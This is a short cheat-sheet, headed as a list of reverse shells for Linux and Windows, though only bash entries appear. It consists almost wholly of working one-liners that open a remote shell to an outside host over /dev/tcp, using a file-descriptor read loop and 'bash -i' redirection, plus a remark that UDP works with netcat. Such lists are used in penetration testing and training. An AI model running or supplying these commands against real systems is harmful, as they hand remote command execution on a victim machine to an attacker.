###### A list of reverse shells for linux and windows

Bash reverse shell
A bash reverse shell one-liner command using custom file descriptor is as follows (it won't be a tty):

exec 100<>/dev/tcp/192.168.2.6/8080 
cat <&100 | while read line; do $line 2>&100 >&100; done 
Or:

while read line 0<&100; do $line 2>&100 >&100; done 
A bash reverse shell one-liner command using bash's interactive mode is as follows:

bash -i >& /dev/tcp/192.168.2.6/8080 0>&1 
In both cases, you can use /dev/tcp for TCP-based reverse shell and /dev/udp for UDP-based reverse shell. (For a UDP connection, use the -u switch with netcat to get the shell over UDP.)
